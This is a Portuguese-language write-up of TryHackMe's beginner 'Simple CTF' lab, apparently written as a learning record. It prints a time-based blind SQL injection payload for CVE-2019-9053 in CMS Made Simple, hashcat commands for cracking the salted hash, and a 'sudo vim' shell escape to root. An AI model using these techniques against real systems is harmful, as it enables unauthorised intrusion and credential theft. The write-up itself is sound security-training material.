# Simple CTF — TryHackMe

[🇺🇸 English version](README.md)

> **Categoria:** `Web` · `Linux`
> **Dificuldade:** 🟢 Fácil
> **Pontos:** `300 pts`
> **Data:** 16/04/2026
> **Autor do desafio:** `MrSeth6797`

> ⚠️ **Nota:** flags, senhas e hashes foram omitidos de propósito, conforme a Acceptable Use Policy do TryHackMe. O foco deste write-up é metodologia e raciocínio.

---

## TL;DR

> O desafio expõe um CMS vulnerável a SQLi baseada em tempo (CVE-2019-9053). Extraí credenciais com um exploit adaptado para Python 2, quebrei o hash com hashcat e escalei privilégios via `sudo vim` para obter acesso root.

---

## 📌 Descrição

> Beginner level ctf

**Acesso:**
- IP: `10.64.161.157` (muda a cada sessão)
- URL: `http://10.64.161.157`

---

## 🔍 Reconhecimento

Como eu tinha apenas o IP da máquina, comecei com o nmap para ver quais portas estavam abertas e traçar uma abordagem em cima delas.

```bash
# enumerando portas com nmap
nmap -sV -sC -Pn -oN nmap.txt 10.64.161.157

# output
21/tcp   (FTP)  - vsftpd 3.0.3
80/tcp   (HTTP) - Apache 2.4.18 (Ubuntu)
2222/tcp (SSH)  - OpenSSH 7.2p2
```

```bash
# enumerando diretórios com o gobuster
gobuster dir -u http://10.64.161.157 -w /usr/share/wordlists/dirb/common.txt

# output
robots.txt   (Status: 200)
simple       (Status: 301) [--> http://10.64.161.157/simple/]
```

**Observações relevantes:**
- FTP permite login anônimo e trafega em texto plano (sem criptografia)
- Falha ao listar diretórios via FTP (possível restrição)
- `robots.txt` menciona um diretório sensível (`/openemr-5_0_1_3`). Acesso sem sucesso
- SSH em porta não padrão (2222)
- O gobuster identificou o diretório `/simple/`

---

## 🧠 Raciocínio

Após observar o output do nmap, decidi começar pela página web em busca de uma vulnerabilidade. Dentro de `/simple/`, achei o nome e a versão do CMS: CMS Made Simple v2.2.8. Usei `searchsploit cms made simple` no Kali e localizei uma vulnerabilidade de SQLi.

Ao rodar o exploit, tive um problema com a biblioteca `termcolor` e com a versão do Python em que ele foi escrito, então adaptei o código: removi a biblioteca e ajustei para Python 2. O ataque retornou 3 dados importantes: username, hash da senha e salt.

Aqui foi a parte que mais me confundiu. O `hash-identifier` apontou para o salt duas possibilidades de tipo (MD5 e MySQL), e para o hash da senha, MD5. Eu não sabia se o tipo influenciava na hora de quebrar, mas, pelo que pesquisei, dava para usar hashcat ou John the Ripper, e preferi o hashcat.

Depois de quebrar o hash, imaginei que a senha serviria no SSH. Funcionou. No diretório do usuário encontrei o `user.txt`. Em seguida, suspeitei que a outra flag estivesse no diretório do root, então executei `sudo -l` para ver quais binários o usuário podia rodar com sudo, e vi que o `/usr/bin/vim` estava liberado. Pesquisei e escalei privilégios com `sudo vim -c ':!/bin/bash'`. O prompt de root apareceu e a última flag estava no diretório do root.

---

## 🛠️ Exploração

### Passo 1 — Exploração da SQLi

O exploit usa SQLi baseada em tempo (*blind*): injeta um `sleep()` condicional na query e descobre a senha um caractere por vez.

```bash
python2 exploit2.py -u http://10.64.161.157/simple/
```

Trecho do exploit (lógica da injeção):

```python
payload = (
    "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")"
    "+from+cms_users"
    "+where+password+like+0x" + ord_password_temp + "25"
    "+and+user_id+like+0x31)+--+"
)

url = url_vuln + "&m1_idlist=" + payload

start_time = time.time()
r = session.get(url)
elapsed_time = time.time() - start_time

# Se o servidor demorou >= TIME segundos, o caractere está correto
if elapsed_time >= TIME:
    password = temp_password  # confirma o caractere e avança
```

**Output obtido:**
```
Salt for password found: <redacted>
Username: mitch
Email found: admin@admin.com
Password found: <redacted hash>
```

---

### Passo 2 — Quebrando o hash

O hash é salgado (`md5(salt + senha)`), por isso usei o modo `20` do hashcat, passando `hash:salt`:

```bash
hashcat -m 20 <hash>:<salt> /usr/share/wordlists/rockyou.txt
```

**Output obtido:**
```
<hash>:<salt>:<redacted>
```

---

### Passo 3 — Acesso via SSH e escalada de privilégios

```bash
ssh -p 2222 mitch@10.64.161.157
```

Já dentro da máquina, executei `sudo -l` para listar o que o usuário podia rodar com sudo. O retorno incluiu `/usr/bin/vim`.

```bash
sudo vim -c ':!/bin/bash'
```

Com o shell de root, li os arquivos das duas flags (`user.txt` no diretório do usuário e `root.txt` no diretório do root).

---

## 🚩 Flags

- `user.txt`: omitida conforme a política do TryHackMe
- `root.txt`: omitida conforme a política do TryHackMe

---

## 📚 Conceitos e técnicas

| Conceito/Ferramenta | Como foi utilizado |
|---|---|
| SQL Injection baseada em tempo (Blind SQLi) | O exploit injeta um `sleep()` condicional na query. Se o servidor demora >= N segundos para responder, o caractere testado está correto. Os dados saem um caractere por vez, sem retorno direto na resposta HTTP. CVE-2019-9053, parâmetro `m1_idlist` do módulo News do CMS Made Simple. |
| Hashcat (modo 20, MD5 salgado) | Quebra offline do hash da senha, com o salt informado junto ao hash. |
| GTFOBins / `sudo vim` | Binários liberados via sudo podem ser abusados para escapar para um shell. O vim permite executar comandos externos com `:!/bin/bash`, resultando em shell root. |

---

## 🔗 Referências

- [CVE-2019-9053](https://www.exploit-db.com/exploits/46635)
- [GTFOBins / Vim](https://gtfobins.org/gtfobins/vim/)

---

## 💬 Considerações finais

Foi um desafio relativamente simples, mas com algumas dificuldades por eu ainda não ter experiência em CTFs. Nada que me impeça de continuar crescendo e me aperfeiçoando. Por ser o meu primeiro desafio resolvido, guardarei os conhecimentos obtidos aqui com muito carinho.

---

<div align="center">
  <sub>Write-up por <a href="https://github.com/BrennoSantAnna">@BrennoSantAnna</a> · <a href="https://linkedin.com/in/brennosantanna">LinkedIn</a></sub>
</div>
